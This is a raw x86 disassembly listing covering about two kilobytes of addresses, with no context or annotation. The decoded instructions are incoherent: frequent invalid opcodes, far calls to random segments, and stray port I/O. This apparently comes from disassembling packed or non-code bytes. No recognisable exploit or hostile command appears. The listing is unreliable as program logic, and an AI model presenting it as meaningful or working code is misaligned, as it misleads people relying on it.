  430bf2:	mov    cl,0xa7
  430bf4:	jb     0x430b7c
  430bf6:	loope  0x430c44
  430bf8:	adc    al,0xd0
  430bfa:	cdq    
  430bfb:	ror    bh,cl
  430bfd:	rol    DWORD PTR [esi+0x1a65fc4b],0xfc
  430c04:	adc    DWORD PTR [edx-0x37],eax
  430c07:	enter  0xc43,0x74
  430c0b:	(bad)  
  430c0d:	dec    edi
  430c0e:	xchg   esp,eax
  430c0f:	aaa    
  430c10:	pop    ebp
  430c11:	mov    ebp,0x4bc56426
  430c16:	outs   dx,BYTE PTR ds:[esi]
  430c17:	shl    DWORD PTR [edx-0x6cf18c03],cl
  430c1d:	adc    ebp,DWORD PTR [eax-0x51f487a0]
  430c23:	mov    edi,edx
  430c25:	jecxz  0x430c51
  430c27:	ror    esi,1
  430c29:	or     DWORD PTR [edx+0x152122d5],ebx
  430c2f:	push   ebp
  430c30:	xor    DWORD PTR [esi],ebp
  430c32:	(bad)  
  430c33:	mov    ds:0xd6f0657e,al
  430c38:	int    0x8b
  430c3a:	popf   
  430c3b:	jge    0x430c7f
  430c3d:	dec    ebx
  430c3e:	call   0xcb2a:0x8245d586
  430c45:	inc    edi
  430c46:	xchg   ebx,eax
  430c47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430c48:	jae    0x430c9e
  430c4a:	push   edi
  430c4b:	fidiv  DWORD PTR [eax+edi*1]
  430c4e:	xchg   ecx,eax
  430c4f:	fmul   QWORD PTR [eax+0x25a784f5]
  430c55:	repz or ch,bh
  430c58:	clc    
  430c59:	jmp    0x430cc4
  430c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430c5c:	(bad)  
  430c5d:	mov    ebx,0xf9a294e8
  430c62:	sahf   
  430c63:	mov    eax,0x73fce4b2
  430c68:	jne    0x430c0a
  430c6a:	sub    DWORD PTR [edx+0x104c0b59],ecx
  430c70:	test   BYTE PTR [ebx+ebp*4-0x659e4378],dl
  430c77:	cwde   
  430c78:	or     esi,DWORD PTR [eax-0x686bb9f4]
  430c7e:	fstp   QWORD PTR [esi+0x261acc02]
  430c84:	sbb    eax,0xbdd143a6
  430c89:	xor    eax,0x141c3cd2
  430c8e:	pop    edx
  430c8f:	mov    WORD PTR [edx],?
  430c91:	dec    ebp
  430c92:	push   0x715bc81e
  430c97:	stos   DWORD PTR es:[edi],eax
  430c98:	test   DWORD PTR [edx],ebp
  430c9a:	sbb    BYTE PTR [esp+ebx*2-0x445d657d],al
  430ca1:	and    dl,BYTE PTR [edi+0x44]
  430ca4:	ror    BYTE PTR [esp+ebx*8-0x59],cl
  430ca8:	js     0x430cfb
  430caa:	fisttp WORD PTR [ebx]
  430cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430cad:	pop    esp
  430cae:	push   ebx
  430caf:	xor    eax,0x60b248b2
  430cb4:	fsubr  DWORD PTR [esi]
  430cb6:	ficom  DWORD PTR [edx]
  430cb8:	mov    dh,0xb
  430cba:	adc    edx,DWORD PTR [edi+0x8cf2cf8]
  430cc0:	push   edx
  430cc1:	sub    dh,BYTE PTR [edx-0x6a249bde]
  430cc7:	icebp  
  430cc8:	mov    ebx,0x3607579c
  430ccd:	xchg   edx,eax
  430cce:	popf   
  430ccf:	in     al,dx
  430cd0:	loop   0x430cda
  430cd2:	int    0xd9
  430cd4:	cwde   
  430cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430cd6:	(bad)  
  430cd7:	pusha  
  430cd8:	adc    dh,BYTE PTR [eax-0x724dfbd4]
  430cde:	loopne 0x430cef
  430ce0:	pop    ebx
  430ce1:	inc    ecx
  430ce2:	out    dx,eax
  430ce3:	leave  
  430ce4:	cmp    ecx,DWORD PTR [eax]
  430ce6:	and    esi,DWORD PTR cs:[esi-0x49]
  430cea:	pop    ds
  430ceb:	or     DWORD PTR [edx],ebx
  430ced:	xor    DWORD PTR [edx-0x15],esi
  430cf0:	mov    dl,0xb1
  430cf2:	sub    DWORD PTR [edx],eax
  430cf4:	xchg   edi,eax
  430cf5:	retf   
  430cf6:	pusha  
  430cf7:	mul    ah
  430cf9:	jle    0x430d1e
  430cfb:	mov    al,ds:0x7c0412f4
  430d00:	cdq    
  430d01:	sub    ecx,DWORD PTR [edx-0x65361052]
  430d07:	les    edx,FWORD PTR [edx+0x40]
  430d0a:	loope  0x430d3c
  430d0c:	stos   BYTE PTR es:[edi],al
  430d0d:	and    esp,DWORD PTR [eax]
  430d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430d10:	fild   QWORD PTR [esi]
  430d12:	repnz mov dl,0x49
  430d15:	shl    DWORD PTR [esi-0x7d],cl
  430d18:	rol    BYTE PTR [ecx-0x5c],0xdb
  430d1c:	add    bh,BYTE PTR [ebx-0x9c3762e]
  430d22:	pop    es
  430d23:	mov    eax,0x27d9e93e
  430d28:	mov    DWORD PTR [eax+0x67e38a64],esi
  430d2e:	popf   
  430d2f:	aad    0x83
  430d31:	xor    eax,0xe605f753
  430d36:	mov    dl,BYTE PTR [ebp-0x3b]
  430d39:	clc    
  430d3a:	dec    edx
  430d3b:	dec    edi
  430d3c:	cdq    
  430d3d:	or     al,0x56
  430d3f:	mov    ecx,0x17862f0b
  430d44:	and    al,0x80
  430d46:	and    al,0xba
  430d48:	mov    dl,0x8a
  430d4a:	rcl    BYTE PTR [edi-0x607ccda9],0x46
  430d51:	inc    edi
  430d52:	loope  0x430cfe
  430d54:	mov    ch,0xa4
  430d56:	ret    0x729
  430d59:	pop    ebx
  430d5a:	ret    
  430d5b:	jmp    0x557d:0x709d155b
  430d62:	mov    ds:0x537a32ce,al
  430d67:	mov    edi,0x2a6537c1
  430d6c:	push   ss
  430d6d:	mov    esi,0x285ca43d
  430d72:	ffree  st(3)
  430d74:	jb     0x430ddb
  430d76:	mov    ch,BYTE PTR [ecx-0x4f]
  430d79:	xchg   ebp,eax
  430d7a:	and    BYTE PTR [ebx-0x35],0x7
  430d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430d7f:	and    esi,DWORD PTR [edx-0x3d]
  430d82:	add    BYTE PTR [esp+edx*4+0x5624755b],al
  430d89:	or     esi,DWORD PTR [ecx+0x35]
  430d8c:	jmp    0x430e07
  430d8e:	dec    esp
  430d8f:	aas    
  430d90:	test   eax,0xdc529a4a
  430d95:	mov    edx,0xf609c531
  430d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430d9c:	adc    BYTE PTR [ebp+0x3cc06099],ah
  430da2:	add    eax,0xfd0fb3ff
  430da7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430da8:	imul   edi,DWORD PTR [esi],0x636ad0d2
  430dae:	and    al,0xa7
  430db0:	and    al,0x1
  430db2:	mov    bh,al
  430db4:	push   edx
  430db5:	mov    ss,WORD PTR [ebx]
  430db7:	lahf   
  430db8:	mov    dl,0x36
  430dba:	cmp    cl,BYTE PTR [edx]
  430dbc:	mov    esp,0x5967e2f7
  430dc1:	or     ecx,ebx
  430dc3:	pop    esp
  430dc4:	test   eax,0xefe12eed
  430dc9:	add    DWORD PTR [edx-0x2e5598d8],ebx
  430dcf:	mov    al,0x8a
  430dd1:	push   ss
  430dd2:	xchg   ecx,eax
  430dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430dd4:	cmp    dl,BYTE PTR [ebx+eax*4-0x4b6e2cf8]
  430ddb:	mov    dl,0xb2
  430ddd:	leave  
  430dde:	adc    eax,0x46dcdf57
  430de3:	stos   DWORD PTR es:[edi],eax
  430de4:	adc    cl,BYTE PTR [ebx]
  430de6:	mov    ch,BYTE PTR [ebp+0x2]
  430de9:	aam    0xb7
  430deb:	push   esi
  430dec:	and    bh,bh
  430dee:	jbe    0x430dd4
  430df0:	mov    bl,0xb1
  430df2:	adc    al,0x5
  430df4:	jnp    0x430e4c
  430df6:	pop    edx
  430df7:	dec    esi
  430df8:	jle    0x430e64
  430dfa:	pop    edi
  430dfb:	fstp   TBYTE PTR [edx]
  430dfd:	or     al,0x95
  430dff:	pop    esi
  430e00:	(bad)  
  430e01:	xor    eax,0xa4b6e726
  430e06:	std    
  430e07:	cmc    
  430e08:	push   edx
  430e09:	add    edi,DWORD PTR [esi-0x65b7b8bb]
  430e0f:	lods   al,BYTE PTR ds:[esi]
  430e10:	repz mov ah,bh
  430e13:	(bad)  
  430e14:	das    
  430e15:	or     cl,BYTE PTR [edx+eax*4-0x5eba26dc]
  430e1c:	(bad)  
  430e1d:	jnp    0x430da8
  430e1f:	adc    al,BYTE PTR [esi-0x74]
  430e22:	call   0x86c3:0x4dadea0c
  430e29:	dec    ecx
  430e2a:	cmp    DWORD PTR [eax+0x24726cbb],edi
  430e30:	pop    ss
  430e31:	cwde   
  430e32:	and    al,0xf2
  430e34:	and    ebp,edi
  430e36:	mov    ah,0x5b
  430e38:	pop    ebx
  430e39:	test   eax,0x72a55f68
  430e3e:	aam    0x58
  430e40:	lods   al,BYTE PTR ds:[esi]
  430e41:	pop    esp
  430e42:	pop    edx
  430e43:	pushf  
  430e44:	out    dx,eax
  430e45:	fsubr  st,st(7)
  430e47:	mov    eax,0xab040bd4
  430e4c:	sahf   
  430e4d:	xor    edx,DWORD PTR [ebx-0x36]
  430e50:	adc    eax,0xc5cc68e7
  430e55:	dec    esp
  430e56:	call   0x27d:0x25700fd1
  430e5d:	test   BYTE PTR [ecx+ecx*2-0x4b],0xb
  430e62:	lahf   
  430e63:	lahf   
  430e64:	cld    
  430e65:	bnd js 0x430e1d
  430e68:	push   ds
  430e69:	sbb    eax,0xa9ae4a9a
  430e6e:	jmp    0x60719eb
  430e73:	mov    edx,0x5aa3af3c
  430e78:	mov    dl,0x5c
  430e7a:	jmp    0x430e10
  430e7c:	pop    esp
  430e7d:	cmp    eax,0x47bd11c3
  430e82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430e83:	cmp    esi,eax
  430e85:	retf   
  430e86:	ins    DWORD PTR es:[edi],dx
  430e87:	adc    eax,0xbbd2a6b7
  430e8c:	adc    esi,DWORD PTR [ebx]
  430e8e:	pop    ds
  430e8f:	loopne 0x430e44
  430e91:	pushf  
  430e92:	mov    edx,DWORD PTR [edi]
  430e94:	cmp    al,0x71
  430e96:	js     0x430e23
  430e98:	mov    dl,0x4
  430e9a:	scas   al,BYTE PTR es:[edi]
  430e9b:	jb     0x430ef2
  430e9d:	add    eax,0xc6019ba
  430ea2:	jp     0x430ead
  430ea4:	fist   DWORD PTR [esi+0x38b89454]
  430eaa:	or     DWORD PTR [edx+eiz*2-0x4d2cbdd1],edi
  430eb1:	stc    
  430eb2:	sbb    dl,BYTE PTR [esi]
  430eb4:	lock (bad) 
  430eb6:	icebp  
  430eb7:	addr16 pop eax
  430eb9:	or     esi,DWORD PTR [esi-0x3541f384]
  430ebf:	fist   WORD PTR [ebx]
  430ec1:	xor    al,0x9a
  430ec3:	stos   DWORD PTR es:[edi],eax
  430ec4:	scas   al,BYTE PTR es:[edi]
  430ec5:	cmp    bl,BYTE PTR [edx]
  430ec7:	test   al,0x4
  430ec9:	fidivr DWORD PTR [edi+eiz*4]
  430ecc:	in     eax,0x6c
  430ece:	push   ds
  430ecf:	jb     0x430e56
  430ed1:	dec    eax
  430ed2:	xchg   ebx,eax
  430ed3:	sbb    al,0xcb
  430ed5:	dec    edi
  430ed6:	xchg   ebp,eax
  430ed7:	not    dl
  430ed9:	cmp    DWORD PTR cs:[eax],esp
  430edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430edd:	or     eax,0x6943c3da
  430ee2:	dec    esi
  430ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430ee4:	dec    ebx
  430ee5:	arpl   WORD PTR [esi+0x2aca4f20],dx
  430eeb:	inc    eax
  430eec:	mov    al,0x10
  430eee:	pop    ebp
  430eef:	fcomip st,st(3)
  430ef1:	leave  
  430ef2:	mov    cl,0x67
  430ef4:	mov    fs,eax
  430ef6:	sub    DWORD PTR [edi-0x6f83c6b9],esp
  430efc:	jns    0x430f6c
  430efe:	adc    BYTE PTR [ebx],0xb2
  430f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430f02:	aaa    
  430f03:	into   
  430f04:	mov    cl,BYTE PTR [edi+ebx*1-0x3]
  430f08:	in     al,0xb
  430f0a:	(bad)
  430f0d:	sbb    eax,0x7648a255
  430f12:	mov    ah,0x32
  430f14:	xlat   BYTE PTR ds:[ebx]
  430f15:	out    0x9b,eax
  430f17:	mov    edi,0xddd105d4
  430f1c:	jp     0x430f99
  430f1e:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  430f20:	inc    esp
  430f21:	repnz sub cl,BYTE PTR ds:[ebp+0x28]
  430f26:	jg     0x430ee8
  430f28:	inc    esi
  430f29:	stos   DWORD PTR es:[edi],eax
  430f2a:	out    dx,eax
  430f2b:	jbe    0x430f83
  430f2d:	sbb    ebx,DWORD PTR [edx+0x7350902e]
  430f33:	jns    0x430f6f
  430f35:	dec    edi
  430f36:	inc    edi
  430f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430f38:	fbstp  TBYTE PTR [eax+0x98ff1cf]
  430f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430f3f:	add    BYTE PTR [edx-0x35ea6466],dh
  430f45:	push   eax
  430f46:	sub    bh,BYTE PTR [edi+0x6e]
  430f49:	or     esi,DWORD PTR [esi]
  430f4b:	out    0x14,eax
  430f4d:	loopne 0x430fa2
  430f4f:	in     eax,dx
  430f50:	leave  
  430f51:	shl    DWORD PTR [ebp+eax*1-0x3702da05],1
  430f58:	mov    dl,0xca
  430f5a:	or     DWORD PTR [edi],edx
  430f5c:	xor    DWORD PTR [ebp+0x43dfa77e],eax
  430f62:	jns    0x430ef6
  430f64:	in     eax,dx
  430f65:	inc    DWORD PTR [eax+0x68b2ad7c]
  430f6b:	pop    esp
  430f6c:	cmp    eax,0x14067551
  430f71:	retf   0x392d
  430f74:	outs   dx,BYTE PTR ds:[esi]
  430f75:	aas    
  430f76:	test   BYTE PTR [esi+0x4f991ea6],ah
  430f7c:	call   FWORD PTR [ebx+0xd]
  430f7f:	data16 jge 0x430f59
  430f82:	mov    ebx,0x9f825092
  430f87:	(bad)  
  430f89:	jne    0x430faf
  430f8b:	out    0x72,al
  430f8d:	pop    esp
  430f8e:	pop    esp
  430f8f:	arpl   WORD PTR [edi+0xb],si
  430f92:	pop    ebp
  430f93:	js     0x430f4c
  430f95:	mov    dl,0x0
  430f97:	loope  0x430f1d
  430f99:	pop    esp
  430f9a:	call   0x26a6:0xe3961802
  430fa1:	cmp    al,0xaf
  430fa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430fa4:	mov    esp,0x89a1a228
  430fa9:	pop    edx
  430faa:	pop    edi
  430fab:	sub    ecx,DWORD PTR [ecx-0x2f66e721]
  430fb1:	mov    bl,BYTE PTR [esi-0x4c]
  430fb4:	test   al,0xf1
  430fb6:	inc    ecx
  430fb7:	cmp    al,0x46
  430fb9:	outs   dx,DWORD PTR ds:[esi]
  430fba:	shr    DWORD PTR [eax-0x764a70b9],0x8e
  430fc1:	mov    cl,BYTE PTR [esi-0x28]
  430fc4:	jl     0x430fe6
  430fc6:	or     BYTE PTR [edi-0x16],dl
  430fc9:	jle    0x430f68
  430fcb:	sub    BYTE PTR [esi],bl
  430fcd:	xchg   esi,eax
  430fce:	pop    eax
  430fcf:	add    dh,BYTE PTR [ebp+esi*4+0x4e]
  430fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430fd4:	arpl   cx,dx
  430fd6:	lock leave 
  430fd8:	mov    ebx,0xb25cab7f
  430fdd:	jmp    0xc48e:0x42a1165d
  430fe4:	xor    eax,0xf7c0920b
  430fe9:	hlt    
  430fea:	inc    ecx
  430feb:	xor    BYTE PTR [esp+eiz*8],ch
  430fee:	call   0x689b:0xa3a1de4c
  430ff5:	or     eax,0x58d2a7ce
  430ffa:	mov    dl,0x29
  430ffc:	or     BYTE PTR [eax],al
  430ffe:	jmp    0xeed9c367
  431003:	ret    
  431004:	ins    DWORD PTR es:[di],dx
  431006:	std    
  431007:	retf   0x8b4d
  43100a:	mov    ecx,DWORD PTR [edi-0x57]
  43100d:	jne    0x431040
  43100f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431010:	in     eax,0xa7
  431012:	cmp    BYTE PTR ds:0x93f9cf7b,bl
  431018:	mov    dl,0xcc
  43101a:	push   edx
  43101b:	sbb    al,0xe8
  43101d:	ins    BYTE PTR es:[edi],dx
  43101e:	bound  ebp,QWORD PTR [ebx]
  431020:	retf   0xa50b
  431023:	loope  0x431004
  431025:	mov    ch,0xf3
  431027:	inc    ax
  431029:	add    al,0x9e
  43102b:	mov    al,ds:0xcda7ed10
  431030:	xor    esi,edi
  431032:	sub    dh,BYTE PTR [edi+0x4e]
  431035:	imul   DWORD PTR [ebx-0x17]
  431038:	add    eax,0x29082e8b
  43103d:	mov    eax,0xa06a649a
  431042:	lods   al,BYTE PTR ds:[esi]
  431043:	cmp    DWORD PTR [ebp+0xc],esi
  431046:	fnstsw WORD PTR [edx-0x18437f01]
  43104c:	fstp   DWORD PTR [edx]
  43104e:	retf   
  43104f:	mov    BYTE PTR [edi+0x5b],bl
  431052:	call   0xc8a4:0xa36c4a63
  431059:	add    eax,0xffffffa7
  43105c:	xor    al,0x17
  43105e:	ret    
  43105f:	mov    edi,0x3448af2d
  431064:	mov    dl,0x33
  431066:	jge    0x430ff3
  431068:	icebp  
  431069:	icebp  
  43106a:	stos   DWORD PTR es:[edi],eax
  43106b:	inc    ebp
  43106c:	xchg   ecx,eax
  43106d:	or     al,BYTE PTR [edi+0x177a09d2]
  431073:	mov    al,0x11
  431075:	iret   
  431076:	inc    edx
  431077:	cmp    al,0xb2
  431079:	dec    ecx
  43107a:	xlat   BYTE PTR ds:[ebx]
  43107b:	jp     0x4310c4
  43107d:	loop   0x431042
  43107f:	mov    gs,WORD PTR [esi-0x316ffdf6]
  431085:	pop    ebx
  431086:	pop    ss
  431087:	adc    edx,esi
  431089:	retf   
  43108a:	add    BYTE PTR [esi-0x77],ah
  43108d:	sbb    al,0xc1
  43108f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431090:	pop    ebx
  431091:	jb     0x4310cf
  431093:	ins    DWORD PTR es:[edi],dx
  431094:	mov    bl,0xd2
  431096:	in     eax,dx
  431097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431098:	ss xor eax,0x65451a3b
  43109e:	or     al,0x68
  4310a0:	mov    dl,0x80
  4310a2:	xor    DWORD PTR [edi],esp
  4310a4:	pop    eax
  4310a5:	not    DWORD PTR [ecx+eiz*2-0x3f]
  4310a9:	add    eax,0x61231d44
  4310ae:	pop    edx
  4310af:	imul   edx,DWORD PTR [esi],0x51
  4310b2:	lods   eax,DWORD PTR ds:[esi]
  4310b3:	ds retf 
  4310b5:	popf   
  4310b6:	call   0x973d:0x2dec3273
  4310bd:	mov    al,0x46
  4310bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4310c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4310c1:	stos   BYTE PTR es:[edi],al
  4310c2:	sub    esp,edi
  4310c4:	mov    ebp,0xb2e28513
  4310c9:	ds adc bl,0xa1
  4310cd:	cmp    DWORD PTR [ecx+eiz*1-0x4b],esi
  4310d1:	or     bh,bh
  4310d3:	pop    esi
  4310d4:	or     eax,0x2ff61eb3
  4310d9:	aam    0x6a
  4310db:	imul   esi,DWORD PTR [edx],0xffffffaa
  4310de:	call   0xfde:0x3977c7f1
  4310e5:	pushf  
  4310e6:	mov    bl,0xa9
  4310e8:	es inc edx
  4310ea:	lods   al,BYTE PTR ds:[esi]
  4310eb:	jge    0x4310ce
  4310ed:	or     ebx,DWORD PTR [ebp+edx*4+0x3e3d589d]
  4310f4:	jmp    0x767a:0x58a70866
  4310fb:	and    eax,0xa7886256
  431100:	adc    DWORD PTR [ecx],esp
  431102:	cwde   
  431103:	mov    WORD PTR ds:0xce978395,?
  431109:	mov    bh,0x98
  43110b:	sar    ebp,1
  43110d:	call   0x4948:0x4bc2ddaf
  431114:	sub    cl,BYTE PTR [ebx]
  431116:	fdiv   DWORD PTR [edi+0x5]
  431119:	(bad)  
  43111a:	cli    
  43111b:	dec    ebp
  43111c:	jg     0x43116e
  43111e:	call   0xff1d:0xf2bdd00
  431125:	sbb    BYTE PTR [eax-0x58],bl
  431128:	scas   eax,DWORD PTR es:[edi]
  431129:	add    bh,BYTE PTR [esp+ebx*1-0x14a9a16e]
  431130:	mov    dh,0xc2
  431132:	call   0xcb5a:0xca1f9597
  431139:	(bad)  
  43113a:	xchg   edx,eax
  43113b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43113c:	mov    ebx,0xcc1ee13c
  431141:	test   DWORD PTR [edx+0x58],0x8195c653
  431148:	sbb    al,0xd2
  43114a:	or     ah,BYTE PTR [edi+0x39]
  43114d:	addr16 mov eax,0x487d8468
  431153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431154:	add    ch,BYTE PTR [ebp-0x4e]
  431157:	mov    eax,0x54d72205
  43115c:	mov    dl,0x4f
  43115e:	adc    eax,0xdf685a87
  431163:	cmp    eax,0x241a9c14
  431168:	xchg   esi,eax
  431169:	mov    ah,0x35
  43116b:	and    dh,BYTE PTR [edx-0x74652b14]
  431171:	in     eax,0x37
  431173:	fwait
  431174:	jp     0x4311ab
  431176:	fs pop eax
  431178:	cmp    eax,0xbc270dd3
  43117d:	inc    esp
  43117e:	std    
  43117f:	mov    dl,0xd5
  431181:	retf   
  431182:	fwait
  431183:	hlt    
  431184:	repz mov esp,0xd6b22de2
  43118a:	je     0x4311f6
  43118c:	fnstcw WORD PTR [eax+0x3b]
  43118f:	add    ecx,ebx
  431191:	or     ebp,DWORD PTR [ebx]
  431193:	cmp    DWORD PTR [edi],0xeb040c6c
  431199:	jne    0x431135
  43119b:	nop
  43119c:	mov    al,ds:0xd6f30453
  4311a1:	bound  esp,QWORD PTR [bx+0x1db1]
  4311a6:	icebp  
  4311a7:	jp     0x431195
  4311a9:	loop   0x4311c5
  4311ab:	inc    esi
  4311ac:	mov    dl,0x23
  4311ae:	pop    es
  4311af:	push   esp
  4311b0:	adc    BYTE PTR [edx+0x76282add],bl
  4311b6:	nop
  4311b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4311b8:	out    dx,al
  4311b9:	jle    0x4311ca
  4311bb:	int    0xd1
  4311bd:	mov    ch,0xc3
  4311bf:	push   esi
  4311c0:	mov    dl,0xbe
  4311c2:	pusha  
  4311c3:	or     esp,0x7f
  4311c6:	push   es
  4311c7:	ret    0xbe9
  4311ca:	push   eax
  4311cb:	push   esp
  4311cc:	jb     0x4311be
  4311ce:	scas   al,BYTE PTR es:[edi]
  4311cf:	add    DWORD PTR [ebx-0x5b],ebx
  4311d2:	call   0x9779:0xf87c33a3
  4311d9:	mov    ds:0xaf779bfd,eax
  4311de:	sbb    edx,DWORD PTR ds:0x3572111b
  4311e4:	(bad)  
  4311e5:	cmp    edi,edx
  4311e7:	ja     0x43119f
  4311e9:	fidivr DWORD PTR [ecx]
  4311eb:	inc    edi
  4311ec:	fdivr  DWORD PTR [edi]
  4311ee:	sbb    al,BYTE PTR [esi+0x2c]
  4311f1:	dec    eax
  4311f2:	nop
  4311f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4311f4:	cld    
  4311f5:	cwde   
  4311f6:	js     0x4311f1
  4311f8:	mov    ebp,0xb26e5e0e
  4311fd:	es clc 
  4311ff:	cli    
  431200:	loopne 0x431266
  431202:	icebp  
  431203:	sub    DWORD PTR [esi],0xd4582d0b
  431209:	int3   
  43120a:	xor    DWORD PTR [eax-0x41],edx
  43120d:	cmp    DWORD PTR [ebx-0x59ba96ac],ebx
  431213:	jbe    0x4311f1
  431215:	sahf   
  431216:	jmp    0xc61f:0x880976b8
  43121d:	fld    st(7)
  43121f:	mov    bl,0x72
  431221:	in     al,dx
  431222:	and    ebp,DWORD PTR [edx+esi*4-0x57]
  431226:	fisttp QWORD PTR [eax+0x22]
  431229:	pop    ebx
  43122a:	jge    0x43125a
  43122c:	jno    0x431239
  43122e:	xlat   BYTE PTR ds:[ebx]
  43122f:	cmp    eax,ecx
  431231:	nop
  431232:	sub    eax,0x9ae97481
  431237:	add    ch,cl
  431239:	retf   
  43123a:	aam    0x4a
  43123c:	adc    DWORD PTR [edx+0x30],0x62b03ca7
  431243:	test   esp,esi
  431245:	and    edi,ebp
  431247:	jmp    0x4311fe
  431249:	pop    edi
  43124a:	xchg   esp,eax
  43124b:	add    BYTE PTR [edx],al
  43124d:	mov    ds:0x127bafea,al
  431252:	push   ebp
  431253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431254:	push   cs
  431255:	xor    DWORD PTR [esi+0x7a],eax
  431258:	and    DWORD PTR [esi+0x9b238c9],ecx
  43125e:	ret    
  43125f:	pop    ecx
  431260:	push   edi
  431261:	pop    ecx
  431262:	in     eax,0x6a
  431264:	cli    
  431265:	out    dx,eax
  431266:	jnp    0x431201
  431268:	jae    0x43127b
  43126a:	call   0x16c8:0xb2d923ab
  431271:	nop
  431272:	call   0x5ee1:0x6ef40955
  431279:	(bad)  
  43127a:	push   edi
  43127b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43127c:	sbb    ah,BYTE PTR [ecx+0x2d]
  43127f:	mov    ds:0x75eb6fab,eax
  431284:	lods   eax,DWORD PTR ds:[esi]
  431285:	jg     0x43123d
  431287:	inc    ecx
  431288:	mov    dl,0xe9
  43128a:	ret    0x1983
  43128d:	dec    ecx
  43128e:	jecxz  0x431237
  431290:	jl     0x4312eb
  431292:	pop    ebx
  431293:	in     al,dx
  431294:	fst    DWORD PTR [ecx-0x25a6fea]
  43129a:	jl     0x431304
  43129c:	mov    dl,0x8a
  43129e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43129f:	or     al,0xf4
  4312a1:	or     eax,0xbbadc47
  4312a6:	dec    ebx
  4312a7:	push   ebx
  4312a8:	cmp    BYTE PTR [esi-0x4a24e038],dl
  4312ae:	call   0xed88:0x9dc87ac6
  4312b5:	cmp    eax,eax
  4312b7:	mov    ecx,eax
  4312b9:	push   0x69cda71e
  4312be:	sub    BYTE PTR [edx+eax*1-0x1b87662e],bh
  4312c5:	dec    eax
  4312c6:	xor    BYTE PTR [eax+0x33],cl
  4312c9:	mov    ebx,0xbb962da
  4312ce:	push   ebp
  4312cf:	gs data16 jo 0x4312c1
  4312d3:	mov    ebp,?
  4312d5:	xchg   DWORD PTR [ebx+0x477ee932],edx
  4312db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4312dc:	mov    esi,0xee1eb9e8
  4312e1:	or     esi,DWORD PTR [ecx]
  4312e3:	test   al,0x97
  4312e5:	mov    ebx,0xc3621288
  4312ea:	add    ch,BYTE PTR [edx+0x3e3463b2]
  4312f0:	and    BYTE PTR [ecx+0x3696aca5],ah
  4312f6:	or     eax,0xec153538
  4312fb:	sub    eax,DWORD PTR [ebp+0x19]
  4312fe:	loope  0x4312cb
  431300:	ror    DWORD PTR [edx+eax*1+0x2621a66],1
  431307:	out    dx,al
  431308:	mov    dl,0xd6
  43130a:	iret   
  43130b:	int    0x5f
  43130d:	nop
  43130e:	push   edi
  43130f:	cmp    bh,BYTE PTR [eax]
  431311:	jb     0x431373
  431313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431314:	int3   
  431315:	cwde   
  431316:	loope  0x431315
  431318:	adc    DWORD PTR ds:0x1db2ef80,0x800c2936
  431322:	in     al,dx
  431323:	rcl    BYTE PTR [ebx+0xb],0x87
  431327:	add    DWORD PTR [ebx],esp
  431329:	cs jbe 0x431311
  43132c:	mov    ecx,0xb4d499af
  431331:	aas    
  431332:	pop    ds
  431333:	cmc    
  431334:	repnz fwait
  431336:	aas    
  431337:	(bad)  
  431338:	cmc    
  431339:	or     al,0xe7
  43133b:	mov    bh,0xd7
  43133d:	mov    eax,0x9b0460fd
  431342:	mov    WORD PTR [ebx],ds
  431344:	ror    DWORD PTR [ebp-0x6c],0xc9
  431348:	sbb    eax,0xf0474e8b
  43134d:	daa    
  43134e:	sub    dl,BYTE PTR [edx]
  431350:	out    0xef,eax
  431352:	loopne 0x4312f8
  431354:	mov    ds:0x7185bb67,eax
  431359:	lds    edx,FWORD PTR [edx]
  43135b:	cwde   
  43135c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43135d:	cs cdq 
  43135f:	sub    ebp,0x48cc7d22
  431365:	fwait
  431366:	aad    0x47
  431368:	mov    WORD PTR [eax+edi*2],cs
  43136b:	sbb    bl,BYTE PTR [ebx+ecx*2+0x15fc47f4]
  431372:	xor    esi,DWORD PTR [edx+esi*4]
  431375:	and    al,0x8a
  431377:	sahf   
  431378:	cmp    ebp,DWORD PTR [eax+0x24dd8d9b]
  43137e:	push   0x44
  431380:	inc    edx
  431381:	mov    ah,0x95
  431383:	das    
  431384:	(bad)  
  431385:	jns    0x4313e9
  431387:	out    0x89,eax
  431389:	mov    dl,0x76
  43138b:	push   ecx
  43138c:	push   ss
  43138d:	xor    ecx,ebp
  43138f:	aas    
  431390:	cmp    DWORD PTR [eax-0x4ecd908f],edi
  431396:	mov    ds:0x9a678e1c,eax
  43139b:	jecxz  0x431333
